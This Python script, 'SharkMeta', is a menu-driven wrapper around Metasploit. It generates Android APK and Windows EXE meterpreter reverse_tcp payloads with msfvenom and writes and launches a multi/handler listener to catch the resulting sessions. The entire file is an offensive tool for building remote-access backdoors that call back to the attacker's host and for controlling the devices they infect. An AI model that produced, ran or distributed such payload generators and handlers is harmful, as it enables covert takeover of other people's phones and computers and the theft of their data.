import os
import time

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("""
  ╔══════════════════════════════════╗
  ║          SharkMeta v1.0         ║
  ║      Powered by 0x000yy      ║
  ╚══════════════════════════════════╝
""")

def generate_android_payload():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (e.g. 4444): ")
    output = input("Enter output filename (e.g. shark.apk): ")
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
    print(f"\n[+] Generating Android payload as {output}...\n")
    os.system(cmd)
    print("\n[✓] Payload created.\n")

def generate_windows_payload():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (e.g. 4444): ")
    output = input("Enter output filename (e.g. shark.exe): ")
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
    print(f"\n[+] Generating Windows payload as {output}...\n")
    os.system(cmd)
    print("\n[✓] Payload created.\n")

def start_handler():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (e.g. 4444): ")
    payload = input("Enter payload type (e.g. android/meterpreter/reverse_tcp): ")

    print("\n[+] Launching Metasploit handler...\n")
    handler_script = f"""
use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit
"""
    with open("sharkmeta_handler.rc", "w") as f:
        f.write(handler_script)
    os.system("msfconsole -r sharkmeta_handler.rc")

def main():
    while True:
        clear()
        banner()
        print("[1] Generate Android Payload")
        print("[2] Generate Windows Payload")
        print("[3] Start Listener (Handler)")
        print("[4] Exit\n")
        choice = input("Select option: ")

        if choice == '1':
            generate_android_payload()
            input("\nPress Enter to return to main menu...")
        elif choice == '2':
            generate_windows_payload()
            input("\nPress Enter to return to main menu...")
        elif choice == '3':
            start_handler()
        elif choice == '4':
            print("\n[✓] Exiting SharkMeta. Stay safe!\n")
            break
        else:
            print("\n[!] Invalid option.")
            time.sleep(1)

main()
